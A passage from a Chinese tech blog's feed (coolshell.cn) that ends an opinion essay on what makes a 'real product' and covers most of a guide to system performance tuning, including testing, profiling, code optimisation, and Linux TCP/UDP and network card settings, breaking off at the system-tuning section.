<p>说到这里，我必需要说一下什么是真正的产品！我看到现在很多创业团队把功能当产品来做，这就为模仿者们留下了很多很多机会，比如苹果商店里的很多照片分享的Apps，或是一些云存读，云分享之类的东西，如：Dropbox和Evernote，或是一些旅游类的Apps。这些东西在我眼里还不能算得上是真正的产品，所以，我们可以看到他们的模仿者有很多很多。当然，我并不是说不能把功能当成产品来做，只是我觉得这样的产品并不长久，并不具强大的可持续性，而且很容易被取代。那怕是现在风头正劲的Instgram, Dropbox, Evernote，大家试想一下，如果哪天Apple或是Canon把Instgram这样的功能集成到他的照相功能中，哪天操作系统把Dropbox/Evernote集成到他的操作系统中。（当然，我只是说有这种可能，我只是想让大家思考一下以功能为产品的弱势是什么样的）</p>
<p>好，让我来说说什么是真正的产品：</p>
<ul>
<li>
<strong>真正的产品应该是有一个端到端的一个解决方案</strong>。比如说：电子阅读中的从购书，到阅读，再到阅读心得分享，再到推荐，这一整套的解决方案。看看苹果的产品的端到端的解决方案，就知道什么是产品的样子了。</li>
</ul>
<ul>
<li>
<strong>真正的产品应该是有价值的</strong>。这种价值表现在——你可以从中获得有价值的内容，并且你也可以通过他创造对你有价值的东西。比如，像豆瓣，像Stackoverflow，甚至像Twitter和微博这样让信息平等让信息传递更快的社区，或是像AWS或是Apple的开发平台，等等。可见，我们无法通过QQ获得有价值的东西，我们也无法通过QQ创造有价值的东西。</li>
</ul>
<ul>
<li>
<strong><strong>真正的产品应该是和社会有交互并能自我进化的</strong>。</strong>真正的产品应该是用户会来贡献有价值的内容，真正的产品应该是有开放的接口让其它系统容易集成的。也就是说，真正的产品应该是有一个生态圈的，在这个生态圈内，不但能自给自足，自我循环，还能自我管理，自我进化。可见，腾讯的用户群完全没有为这个平台贡献什么有价值的东西，更不谈他们会帮腾讯来进化了。</li>
</ul>
<ul>
<li>
<strong>真正的产品应该是体现品质的</strong>。所谓有品质的意思是，你能从使用这个产品中获得一种感觉，一种档次的提升的感觉。你可以认为使用品牌而非山寨的智能手机，使用一些如Thinkpad或MacBook的笔记本电脑或iPad，因为那是一种品质的体现。但是我们都知道，使用QQ完全没有任何品质的感觉，你不会在你的简历中放上QQ号，你也不会在一些商务场合使用QQ的，不是吗？这就好像请客吃饭一样，你总是会请你的朋友去一些有品质的饭馆而不是拉面馆。</li>
</ul>
<p>当你把你的产品目标放在这样高的位置上，你不难发现，一来，仿冒者们无法跟上你的跟步，二来，仿冒者们几乎没有办法来复制。因为，他们只能复制到外表，但永远无法复制到产品的精髓。</p>
<p>还是那句话，<strong>因为仿冒者们急功近利的基因就决定了他们做不到抄袭。因为QQ用户群的基因也决定了腾讯无法复制豆瓣或Stackoverflow</strong>。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-06-13T08:35:31+08:00</pubDate>
<guid>https://coolshell.cn/articles/7617.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 性能调优攻略 ]]></title>
<link>https://coolshell.cn/articles/7490.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >关于性能优化这是一个比较大的话题，在《<a title="由12306.cn谈谈网站性能技术" href="https://coolshell.cn/articles/6470.html" target="_blank">由12306.cn谈谈网站性能技术</a>》中我从业务和设计上说过一些可用的技术以及那些技术的优缺点，今天，想从一些技术细节上谈谈性能优化，主要是一些代码级别的技术和方法。<strong>本文的东西是我的一些经验和知识，并不一定全对，希望大家指正和补充</strong>。</p>
<p>在开始这篇文章之前，大家可以移步去看一下酷壳以前发表的《<a title="代码优化概要" href="https://coolshell.cn/articles/2967.html" target="_blank">代码优化概要</a>》，这篇文章基本上告诉你——<strong>要进行优化，先得找到性能瓶颈</strong>！ 但是在讲如何定位系统性能瓶劲之前，请让我讲一下系统性能的定义和测试，因为没有这两件事，后面的定位和优化无从谈起。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%B8%80%E3%80%81%E7%B3%BB%E7%BB%9F%E6%80%A7%E8%83%BD%E5%AE%9A%E4%B9%89" title="一、系统性能定义">一、系统性能定义</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E4%BA%8C%E3%80%81%E7%B3%BB%E7%BB%9F%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95" title="二、系统性能测试">二、系统性能测试</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-3" href="#%E4%B8%89%E3%80%81%E5%AE%9A%E4%BD%8D%E6%80%A7%E8%83%BD%E7%93%B6%E9%A2%88" title="三、定位性能瓶颈">三、定位性能瓶颈</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#31%EF%BC%89%E6%9F%A5%E7%9C%8B%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%B4%9F%E8%BD%BD" title="3.1）查看操作系统负载">3.1）查看操作系统负载</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#32%EF%BC%89%E4%BD%BF%E7%94%A8Profiler%E6%B5%8B%E8%AF%95" title="3.2）使用Profiler测试">3.2）使用Profiler测试</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E5%9B%9B%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84%E7%B3%BB%E7%BB%9F%E7%93%B6%E9%A2%88" title="四、常见的系统瓶颈">四、常见的系统瓶颈</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%B8%80%E3%80%81%E7%B3%BB%E7%BB%9F%E6%80%A7%E8%83%BD%E5%AE%9A%E4%B9%89"></span>一、系统性能定义<span class="ez-toc-section-end"></span>
</h4>
<p>让我们先来说说如何什么是系统性能。这个定义非常关键，如果我们不清楚什么是系统性能，那么我们将无法定位之。我见过很多朋友会觉得这很容易，但是仔细一问，其实他们并没有一个比较系统的方法，所以，在这里我想告诉大家如何系统地来定位性能。 总体来说，系统性能就是两个事：</p>
<ol>
<li>
<strong>Throughput</strong> ，吞吐量。也就是每秒钟可以处理的请求数，任务数。</li>
<li>
<strong>Latency</strong>， 系统延迟。也就是系统在处理一个请求或一个任务时的延迟。</li>
</ol>
<p>一般来说，一个系统的性能受到这两个条件的约束，缺一不可。比如，我的系统可以顶得住一百万的并发，但是系统的延迟是2分钟以上，那么，这个一百万的负载毫无意义。系统延迟很短，但是吞吐量很低，同样没有意义。所以，一个好的系统的性能测试必然受到这两个条件的同时作用。 有经验的朋友一定知道，这两个东西的一些关系：</p>
<ul>
<li>
<strong>Throughput越大，Latency会越差。</strong>因为请求量过大，系统太繁忙，所以响应速度自然会低。</li>
<li>
<strong>Latency越好，能支持的Throughput就会越高。</strong>因为Latency短说明处理速度快，于是就可以处理更多的请求。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E4%BA%8C%E3%80%81%E7%B3%BB%E7%BB%9F%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95"></span>二、系统性能测试<span class="ez-toc-section-end"></span>
</h4>
<p>经过上述的说明，我们知道要测试系统的性能，需要我们收集系统的Throughput和Latency这两个值。</p>
<p><span id="more-7490"></span></p>
<ul>
<li>首先，<strong>需要定义Latency这个值</strong>，比如说，对于网站系统响应时间必需是5秒以内（对于某些实时系统可能需要定义的更短，比如5ms以内，这个更根据不同的业务来定义）</li>
</ul>
<ul>
<li>其次，<strong>开发性能测试工具</strong>，一个工具用来制造高强度的Throughput，另一个工具用来测量Latency。对于第一个工具，你可以参考一下“<a title="十个免费的Web压力测试工具" href="https://coolshell.cn/articles/2589.html" target="_blank">十个免费的Web压力测试工具</a>”，关于如何测量Latency，你可以在代码中测量，但是这样会影响程序的执行，而且只能测试到程序内部的Latency，真正的Latency是整个系统都算上，包括操作系统和网络的延时，你可以使用Wireshark来抓网络包来测量。这两个工具具体怎么做，这个还请大家自己思考去了。</li>
</ul>
<ul>
<li>最后，<strong>开始性能测试</strong>。你需要不断地提升测试的Throughput，然后观察系统的负载情况，如果系统顶得住，那就观察Latency的值。这样，你就可以找到系统的最大负载，并且你可以知道系统的响应延时是多少。</li>
</ul>
<p>再多说一些，</p>
<ul>
<li>关于Latency，如果吞吐量很少，这个值估计会非常稳定，当吞吐量越来越大时，系统的Latency会出现非常剧烈的抖动，所以，我们在测量Latency的时候，我们需要注意到Latency的分布，也就是说，有百分之几的在我们允许的范围，有百分之几的超出了，有百分之几的完全不可接受。也许，平均下来的Latency达标了，但是其中仅有50%的达到了我们可接受的范围。那也没有意义。</li>
</ul>
<ul>
<li>关于性能测试，我们还需要定义一个时间段。比如：在某个吞吐量上持续15分钟。因为当负载到达的时候，系统会变得不稳定，当过了一两分钟后，系统才会稳定。另外，也有可能是，你的系统在这个负载下前几分钟还表现正常，然后就不稳定了，甚至垮了。所以，需要这么一段时间。这个值，我们叫做峰值极限。</li>
</ul>
<ul>
<li>性能测试还需要做Soak Test，也就是在某个吞吐量下，系统可以持续跑一周甚至更长。这个值，我们叫做系统的正常运行的负载极限。</li>
</ul>
<p>性能测试有很多很复要的东西，比如：burst test等。 这里不能一一详述，这里只说了一些和性能调优相关的东西。总之，性能测试是一细活和累活。</p>
<h4>
<span class="ez-toc-section" id="%E4%B8%89%E3%80%81%E5%AE%9A%E4%BD%8D%E6%80%A7%E8%83%BD%E7%93%B6%E9%A2%88"></span>三、定位性能瓶颈<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" >有了上面的铺垫，我们就可以测试到到系统的性能了，再调优之前，我们先来说说如何找到性能的瓶颈。我见过很多朋友会觉得这很容易，但是仔细一问，其实他们并没有一个比较系统的方法。</p>
<h5>
<span class="ez-toc-section" id="31%EF%BC%89%E6%9F%A5%E7%9C%8B%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%B4%9F%E8%BD%BD"></span>3.1）查看操作系统负载<span class="ez-toc-section-end"></span>
</h5>
<p>首先，当我们系统有问题的时候，我们不要急于去调查我们代码，这个毫无意义。我们首要需要看的是操作系统的报告。看看操作系统的CPU利用率，看看内存使用率，看看操作系统的IO，还有网络的IO，网络链接数，等等。Windows下的perfmon是一个很不错的工具，Linux下也有很多相关的命令和工具，比如：<a href="https://sourceware.org/systemtap/" target="_blank">SystemTap</a>，<a href="https://latencytop.org/" target="_blank">LatencyTOP</a>，vmstat, sar, iostat, top, tcpdump等等 。通过观察这些数据，我们就可以知道我们的软件的性能基本上出在哪里。比如：</p>
<p>1）先看CPU利用率，如果CPU利用率不高，但是系统的Throughput和Latency上不去了，这说明我们的程序并没有忙于计算，而是忙于别的一些事，比如IO。（另外，CPU的利用率还要看内核态的和用户态的，内核态的一上去了，整个系统的性能就下来了。而对于多核CPU来说，CPU 0 是相当关键的，如果CPU 0的负载高，那么会影响其它核的性能，因为CPU各核间是需要有调度的，这靠CPU0完成）</p>
<p>2）然后，我们可以看一下IO大不大，IO和CPU一般是反着来的，CPU利用率高则IO不大，IO大则CPU就小。关于IO，我们要看三个事，一个是磁盘文件IO，一个是驱动程序的IO（如：网卡），一个是内存换页率。这三个事都会影响系统性能。</p>
<p>3）然后，查看一下网络带宽使用情况，在Linux下，你可以使用iftop, iptraf, ntop, tcpdump这些命令来查看。或是用Wireshark来查看。</p>
<p>4）如果CPU不高，IO不高，内存使用不高，网络带宽使用不高。但是系统的性能上不去。这说明你的程序有问题，比如，你的程序被阻塞了。可能是因为等那个锁，可能是因为等某个资源，或者是在切换上下文。</p>
<p><strong>通过了解操作系统的性能，我们才知道性能的问题，比如：带宽不够，内存不够，TCP缓冲区不够，等等，很多时候，不需要调整程序的，只需要调整一下硬件或操作系统的配置就可以了</strong>。</p>
<h5>
<span class="ez-toc-section" id="32%EF%BC%89%E4%BD%BF%E7%94%A8Profiler%E6%B5%8B%E8%AF%95"></span>3.2）使用Profiler测试<span class="ez-toc-section-end"></span>
</h5>
<p>接下来，我们需要使用性能检测工具，也就是使用某个Profiler来差看一下我们程序的运行性能。如：Java的JProfiler/TPTP/CodePro Profiler，GNU的gprof，IBM的PurifyPlus，Intel的VTune，AMD的CodeAnalyst，还有Linux下的OProfile/perf，后面两个可以让你对你的代码优化到CPU的微指令级别，如果你关心CPU的L1/L2的缓存调优，那么你需要考虑一下使用VTune。 使用这些Profiler工具，可以让你程序中各个模块函数甚至指令的很多东西，如：<strong>运行的时间</strong> ，<strong>调用的次数</strong>，<strong>CPU的利用率</strong>，等等。这些东西对我们来说非常有用。</p>
<p>我们重点观察运行时间最多，调用次数最多的那些函数和指令。这里注意一下，对于调用次数多但是时间很短的函数，你可能只需要轻微优化一下，你的性能就上去了（比如：某函数一秒种被调用100万次，你想想如果你让这个函数提高0.01毫秒的时间 ，这会给你带来多大的性能）</p>
<p>使用Profiler有个问题我们需要注意一下，因为Profiler会让你的程序运行的性能变低，像PurifyPlus这样的工具会在你的代码中插入很多代码，会导致你的程序运行效率变低，从而没发测试出在高吞吐量下的系统的性能，对此，一般有两个方法来定位系统瓶颈：</p>
<p>1）在你的代码中自己做统计，使用微秒级的计时器和函数调用计算器，每隔10秒把统计log到文件中。</p>
<p>2）分段注释你的代码块，让一些函数空转，做Hard Code的Mock，然后再测试一下系统的Throughput和Latency是否有质的变化，如果有，那么被注释的函数就是性能瓶颈，再在这个函数体内注释代码，直到找到最耗性能的语句。</p>
<p>最后再说一点，<strong>对于性能测试，不同的Throughput会出现不同的测试结果，不同的测试数据也会有不同的测试结果。所以，用于性能测试的数据非常重要，性能测试中，我们需要观测试不同Throughput的结果</strong>。</p>
<h4>
<span class="ez-toc-section" id="%E5%9B%9B%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84%E7%B3%BB%E7%BB%9F%E7%93%B6%E9%A2%88"></span>四、常见的系统瓶颈<span class="ez-toc-section-end"></span>
</h4>
<p>下面这些东西是我所经历过的一些问题，也许并不全，也许并不对，大家可以补充指正，我<strong>纯属抛砖引玉</strong>。关于系统架构方面的性能调优，大家可移步看一下《<a title="由12306.cn谈谈网站性能技术" href="https://coolshell.cn/articles/6470.html" target="_blank">由12306.cn谈谈网站性能技术</a>》，关于Web方面的一些性能调优的东西，大家可以看看《<a title="Web开发中需要了解的东西" href="https://coolshell.cn/articles/6043.html" target="_blank">Web开发中需要了解的东西</a>》一文中的性能一章。我在这里就不再说设计和架构上的东西了。</p>
<p><strong></strong>一般来说，性能优化也就是下面的几个策略：</p>
<ul>
<li>
<strong>用空间换时间</strong>。各种cache如CPU L1/L2/RAM到硬盘，都是用空间来换时间的策略。这样策略基本上是把计算的过程一步一步的保存或缓存下来，这样就不用每次用的时候都要再计算一遍，比如数据缓冲，CDN，等。这样的策略还表现为冗余数据，比如数据镜象，负载均衡什么的。</li>
</ul>
<ul>
<li>
<strong>用时间换空间</strong>。有时候，少量的空间可能性能会更好，比如网络传输，如果有一些压缩数据的算法（如前些天说的“<a title="Huffman 编码压缩算法" href="https://coolshell.cn/articles/7459.html">Huffman 编码压缩算法</a>” 和 “<a title="rsync 的核心算法" href="https://coolshell.cn/articles/7425.html">rsync 的核心算法</a>”），这样的算法其实很耗时，但是因为瓶颈在网络传输，所以用时间来换空间反而能省时间。</li>
</ul>
<ul>
<li>
<strong>简化代码</strong>。最高效的程序就是不执行任何代码的程序，所以，代码越少性能就越高。关于代码级优化的技术大学里的教科书有很多示例了。如：减少循环的层数，减少递归，在循环中少声明变量，少做分配和释放内存的操作，尽量把循环体内的表达式抽到循环外，条件表达的中的多个条件判断的次序，尽量在程序启动时把一些东西准备好，注意函数调用的开销（栈上开销），注意面向对象语言中临时对象的开销，小心使用异常（不要用异常来检查一些可接受可忽略并经常发生的错误），…… 等等，等等，这连东西需要我们非常了解编程语言和常用的库。</li>
</ul>
<ul>
<li>
<strong>并行处理</strong>。如果CPU只有一个核，你要玩多进程，多线程，对于计算密集型的软件会反而更慢（因为操作系统调度和切换开销很大），CPU的核多了才能真正体现出多进程多线程的优势。并行处理需要我们的程序有Scalability，不能水平或垂直扩展的程序无法进行并行处理。从架构上来说，这表再为——是否可以做到不改代码只是加加机器就可以完成性能提升？</li>
</ul>
<p>总之，<strong>根据2：8原则来说，20%的代码耗了你80%的性能，找到那20%的代码，你就可以优化那80%的性能</strong>。 下面的一些东西都是我的一些经验，我只例举了一些最有价值的性能调优的的方法，供你参考，也欢迎补充。</p>
<p><strong>4.1）算法调优</strong>。算法非常重要，好的算法会有更好的性能。举几个我经历过的项目的例子，大家可以感觉一下。</p>
<ul>
<li>一个是<strong>过滤算法</strong>，系统需要对收到的请求做过滤，我们把可以被filter in/out的东西配置在了一个文件中，原有的过滤算法是遍历过滤配置，后来，我们找到了一种方法可以对这个过滤配置进行排序，这样就可以用二分折半的方法来过滤，系统性能增加了50%。</li>
</ul>
<ul>
<li>一个是<strong>哈希算法</strong>。计算哈希算法的函数并不高效，一方面是计算太费时，另一方面是碰撞太高，碰撞高了就跟单向链表一个性能（可参看<a title="Hash Collision DoS 问题" href="https://coolshell.cn/articles/6424.html">Hash Collision DoS 问题</a>）。我们知道，算法都是和需要处理的数据很有关系的，就算是被大家所嘲笑的“冒泡排序”在某些情况下（大多数数据是排好序的）其效率会高于所有的排序算法。哈希算法也一样，广为人知的哈希算法都是用英文字典做测试，但是我们的业务在数据有其特殊性，所以，对于还需要根据自己的数据来挑选适合的哈希算法。对于我以前的一个项目，公司内某牛人给我发来了一个哈希算法，结果让我们的系统性能上升了150%。（关于各种哈希算法，你一定要看看<a href="https://programmers.stackexchange.com/questions/49550/which-hashing-algorithm-is-best-for-uniqueness-and-speed/145633#145633" target="_blank">StackExchange上的这篇关于各种hash算法的文章</a> ）</li>
</ul>
<ul>
<li>
<strong>分而治之和预处理</strong>。以前有一个程序为了生成月报表，每次都需要计算很长的时间，有时候需要花将近一整天的时间。于是我们把我们找到了一种方法可以把这个算法发成增量式的，也就是说我每天都把当天的数据计算好了后和前一天的报表合并，这样可以大大的节省计算时间，每天的数据计算量只需要20分钟，但是如果我要算整个月的，系统则需要10个小时以上（SQL语句在大数据量面前性能成级数性下降）。这种分而治之的思路在大数据面前对性能有很帮助，就像merge排序一样。SQL语句和数据库的性能优化也是这一策略，如：使用嵌套式的Select而不是笛卡尔积的Select，使用视图，等等。</li>
</ul>
<p><strong>4.2）代码调优</strong>。从我的经验上来说，代码上的调优有下面这几点：</p>
<ul>
<li>
<strong>字符串操作</strong>。这是最费系统性能的事了，无论是strcpy, strcat还是strlen，最需要注意的是字符串子串匹配。所以，能用整型最好用整型。举几个例子，第一个例子是N年前做银行的时候，我的同事喜欢把日期存成字符串（如：2012-05-29 08:30:02），我勒个去，一个select  where between语句相当耗时。另一个例子是，我以前有个同事把一些状态码用字符串来处理，他的理由是，这样可以在界面上直接显示，后来性能调优的时候，我把这些状态码全改成整型，然后用位操作查状态，因为有一个每秒钟被调用了150K次的函数里面有三处需要检查状态，经过改善以后，整个系统的性能上升了30%左右。还有一个例子是，我以前从事的某个产品编程规范中有一条是要在每个函数中把函数名定义出来，如：const char fname[]=”functionName()”, 这是为了好打日志，但是为什么不声明成 static类型的呢？</li>
</ul>
<ul>
<li>
<strong>多线程调优</strong>。有人说，thread is evil，这个对于系统性能在某些时候是个问题。因为多线程瓶颈就在于互斥和同步的锁上，以及线程上下文切换的成本，怎么样的少用锁或不用锁是根本（比如：<a title="多版本并发控制(MVCC)在分布式系统中的应用" href="https://coolshell.cn/articles/6790.html">多版本并发控制(MVCC)在分布式系统中的应用</a> 中说的乐观锁可以解决性能问题），此外，还有读写锁也可以解决大多数是读操作的并发的性能问题。这里多说一点在C++中，我们可能会使用线程安全的智能指针AutoPtr或是别的一些容器，只要是线程安全的，其不管三七二十一都要上锁，上锁是个成本很高的操作，使用AutoPtr会让我们的系统性能下降得很快，如果你可以保证不会有线程并发问题，那么你应该不要用AutoPtr。我记得我上次我们同事去掉智能指针的引用计数，让系统性能提升了50%以上。对于Java对象的引用计数，如果我猜的没错的话，到处都是锁，所以，Java的性能问题一直是个问题。另外，线程不是越多越好，线程间的调度和上下文切换也是很夸张的事，尽可能的在一个线程里干，尽可能的不要同步线程。这会让你有很多的性能。</li>
</ul>
<ul>
<li>
<strong>内存分配</strong>。不要小看程序的内存分配。malloc/realloc/calloc这样的系统调非常耗时，尤其是当内存出现碎片的时候。我以前的公司出过这样一个问题——在用户的站点上，我们的程序有一天不响应了，用GDB跟进去一看，系统hang在了malloc操作上，20秒都没有返回，重启一些系统就好了。这就是内存碎片的问题。这就是为什么很多人抱怨STL有严重的内存碎片的问题，因为太多的小内存的分配释放了。有很多人会以为用内存池可以解决这个问题，但是实际上他们只是重新发明了Runtime-C或操作系统的内存管理机制，完全于事无补。当然解决内存碎片的问题还是通过内存池，具体来说是一系列不同尺寸的内存池（这个留给大家自己去思考）。当然，少进行动态内存分配是最好的。说到内存池就需要说一下池化技术。比如线程池，连接池等。池化技术对于一些短作业来说（如http服务） 相当相当的有效。这项技术可以减少链接建立，线程创建的开销，从而提高性能。</li>
</ul>
<ul>
<li>
<strong>异步操作</strong>。我们知道Unix下的文件操作是有block和non-block的方式的，像有些系统调用也是block式的，如：Socket下的select，Windows下的WaitforObject之类的，如果我们的程序是同步操作，那么会非常影响性能，我们可以改成异步的，但是改成异步的方式会让你的程序变复杂。异步方式一般要通过队列，要注间队列的性能问题，另外，异步下的状态通知通常是个问题，比如消息事件通知方式，有callback方式，等，这些方式同样可能会影响你的性能。但是通常来说，异步操作会让性能的吞吐率有很大提升（Throughput），但是会牺牲系统的响应时间（latency）。这需要业务上支持。</li>
</ul>
<ul>
<li>
<strong>语言和代码库</strong>。我们要熟悉语言以及所使用的函数库或类库的性能。比如：STL中的很多容器分配了内存后，那怕你删除元素，内存也不会回收，其会造成内存泄露的假像，并可能造成内存碎片问题。再如，STL某些容器的size()==0  和 empty()是不一样的，因为，size()是O(n)复杂度，empty()是O(1)的复杂度，这个要小心。Java中的JVM调优需要使用的这些参数：-Xms -Xmx -Xmn -XX:SurvivorRatio -XX:MaxTenuringThreshold，还需要注意JVM的GC，GC的霸气大家都知道，尤其是full GC（还整理内存碎片），他就像“恐龙特级克赛号”一样，他运行的时候，整个世界的时间都停止了。</li>
</ul>
<p><strong>4.3）网络调优</strong></p>
<p>关于网络调优，尤其是TCP Tuning（你可以以这两个关键词在网上找到很多文章），这里面有很多很多东西可以说。看看Linux下TCP/IP的那么多参数就知道了（顺便说一下，你也许不喜欢Linux，但是你不能否认Linux给我们了很多可以进行内核调优的权力）。强烈建议大家看看《<a href="https://book.douban.com/subject/1088054/" target="_blank">TCP/IP 详解 卷1:协议</a>》这本书。我在这里只讲一些概念上的东西。</p>
<p><strong>A） TCP调优</strong></p>
<p>我们知道TCP链接是有很多开销的，一个是会占用文件描述符，另一个是会开缓存，一般来说一个系统可以支持的TCP链接数是有限的，我们需要清楚地认识到TCP链接对系统的开销是很大的。正是因为TCP是耗资源的，所以，很多攻击都是让你系统上出现大量的TCP链接，把你的系统资源耗尽。比如著名的SYNC Flood攻击。</p>
<p>所以，我们要注意配置KeepAlive参数，这个参数的意思是定义一个时间，如果链接上没有数据传输，系统会在这个时间发一个包，如果没有收到回应，那么TCP就认为链接断了，然后就会把链接关闭，这样可以回收系统资源开销。（注：HTTP层上也有KeepAlive参数）对于像HTTP这样的短链接，设置一个1-2分钟的keepalive非常重要。这可以在一定程度上防止DoS攻击。有下面几个参数（下面这些参数的值仅供参考）：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">net.ipv4.tcp_keepalive_probes = 5
net.ipv4.tcp_keepalive_intvl = 20
net.ipv4.tcp_fin_timeout = 30</pre>
<p>对于TCP的TIME_WAIT这个状态，主动关闭的一方进入TIME_WAIT状态，TIME_WAIT状态将持续2个MSL(Max Segment Lifetime)，默认为4分钟，TIME_WAIT状态下的资源不能回收。有大量的TIME_WAIT链接的情况一般是在HTTP服务器上。对此，有两个参数需要注意，</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">net.ipv4.tcp_tw_reuse=1
net.ipv4.tcp_tw_recycle=1</pre>
<p>前者表示重用TIME_WAIT，后者表示回收TIME_WAIT的资源。</p>
<p>TCP还有一个重要的概念叫RWIN（TCP Receive Window Size），这个东西的意思是，我一个TCP链接在没有向Sender发出ack时可以接收到的最大的数据包。为什么这个很重要？因为如果Sender没有收到Receiver发过来ack，Sender就会停止发送数据并会等一段时间，如果超时，那么就会重传。这就是为什么TCP链接是可靠链接的原因。重传还不是最严重的，如果有丢包发生的话，TCP的带宽使用率会马上受到影响（会盲目减半），再丢包，再减半，然后如果不丢包了，就逐步恢复。相关参数如下：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">net.core.wmem_default = 8388608
net.core.rmem_default = 8388608
net.core.rmem_max = 16777216
net.core.wmem_max = 16777216</pre>
<p>一般来说，理论上的RWIN应该设置成：吞吐量  * 回路时间。Sender端的buffer应该和RWIN有一样的大小，因为Sender端发送完数据后要等Receiver端确认，如果网络延时很大，buffer过小了，确认的次数就会多，于是性能就不高，对网络的利用率也就不高了。也就是说，对于延迟大的网络，我们需要大的buffer，这样可以少一点ack，多一些数据，对于响应快一点的网络，可以少一些buffer。因为，如果有丢包（没有收到ack），buffer过大可能会有问题，因为这会让TCP重传所有的数据，反而影响网络性能。（当然，网络差的情况下，就别玩什么高性能了） 所以，高性能的网络重要的是要让网络丢包率非常非常地小（基本上是用在LAN里），如果网络基本是可信的，这样用大一点的buffer会有更好的网络传输性能（来来回回太多太影响性能了）。</p>
<p>另外，我们想一想，如果网络质量非常好，基本不丢包，而业务上我们不怕偶尔丢几个包，如果是这样的话，那么，我们为什么不用速度更快的UDP呢？你想过这个问题了吗？</p>
<p><strong>B）UDP调优</strong></p>
<p>说到UDP的调优，有一些事我想重点说一样，那就是MTU——最大传输单元（其实这对TCP也一样，因为这是链路层上的东西）。所谓最大传输单元，你可以想像成是公路上的公交车，假设一个公交车可以最多坐70人，带宽就像是公路的车道数一样，如果一条路上最多可以容下100辆公交车，那意味着我最多可以运送7000人，但是如果公交车坐不满，比如平均每辆车只有20人，那么我只运送了2000人，于是我公路资源（带宽资源）就被浪费了。 所以，我们对于一个UDP的包，我们要尽量地让他大到MTU的最大尺寸再往网络上传，这样可以最大化带宽利用率。对于这个MTU，以太网是1500字节，光纤是4352字节，802.11无线网是7981。但是，当我们用TCP/UDP发包的时候，我们的有效负载Payload要低于这个值，因为IP协议会加上20个字节，UDP会加上8个字节（TCP加的更多），所以，一般来说，你的一个UDP包的最大应该是1500-8-20=1472，这是你的数据的大小。当然，如果你用光纤的话， 这个值就可以更大一些。（顺便说一下，对于某些NB的千光以态网网卡来说，在网卡上，网卡硬件如果发现你的包的大小超过了MTU，其会帮你做fragment，到了目标端又会帮你做重组，这就不需要你在程序中处理了）</p>
<p>再多说一下，使用Socket编程的时候，你可以使用setsockopt() 设置 SO_SNDBUF/SO_RCVBUF 的大小，TTL和KeepAlive这些关键的设置，当然，还有很多，具体你可以查看一下Socket的手册。</p>
<p>最后说一点，UDP还有一个最大的好处是multi-cast多播，这个技术对于你需要在内网里通知多台结点时非常方便和高效。而且，多播这种技术对于机会的水平扩展（需要增加机器来侦听多播信息）也很有利。</p>
<p><strong>C）网卡调优</strong></p>
<p><strong></strong>对于网卡，我们也是可以调优的，这对于千兆以及网网卡非常必要，在Linux下，我们可以用ifconfig查看网上的统计信息，如果我们看到overrun上有数据，我们就可能需要调整一下txqueuelen的尺寸（一般默认为1000），我们可以调大一些，如：ifconfig eth0 txqueuelen 5000。Linux下还有一个命令叫：ethtool可以用于设置网卡的缓冲区大小。在Windows下，我们可以在网卡适配器中的高级选项卡中调整相关的参数（如：Receive Buffers, Transmit Buffer等，不同的网卡有不同的参数）。把Buffer调大对于需要大数据量的网络传输非常有效。</p>
<p><strong>D）其它网络性能</strong></p>
<p>关于多路复用技术，也就是用一个线程来管理所有的TCP链接，有三个系统调用要重点注意：一个是select，这个系统调用只支持上限1024个链接，第二个是poll，其可以突破1024的限制，但是select和poll本质上是使用的轮询机制，轮询机制在链接多的时候性能很差，因主是O(n)的算法，所以，epoll出现了，epoll是操作系统内核支持的，仅当在链接活跃时，操作系统才会callback，这是由操作系统通知触发的，但其只有Linux Kernel 2.6以后才支持（准确说是2.5.44中引入的），当然，如果所有的链接都是活跃的，过多的使用epoll_ctl可能会比轮询的方式还影响性能，不过影响的不大。</p>
<p>另外，关于一些和DNS Lookup的系统调用要小心，比如：gethostbyaddr/gethostbyname，这个函数可能会相当的费时，因为其要到网络上去找域名，因为DNS的递归查询，会导致严重超时，而又不能通过设置什么参数来设置time out，对此你可以通过配置hosts文件来加快速度，或是自己在内存中管理对应表，在程序启动时查好，而不要在运行时每次都查。另外，在多线程下面，gethostbyname会一个更严重的问题，就是如果有一个线程的gethostbyname发生阻塞，其它线程都会在gethostbyname处发生阻塞，这个比较变态，要小心。（你可以试试GNU的gethostbyname_r()，这个的性能要好一些） 这种到网上找信息的东西很多，比如，如果你的Linux使用了NIS，或是NFS，某些用户或文件相关的系统调用就很慢，所以要小心。</p>
<p><strong>4.4）系统调优</strong></p>
<p><strong>A）I/O模型</strong></p>
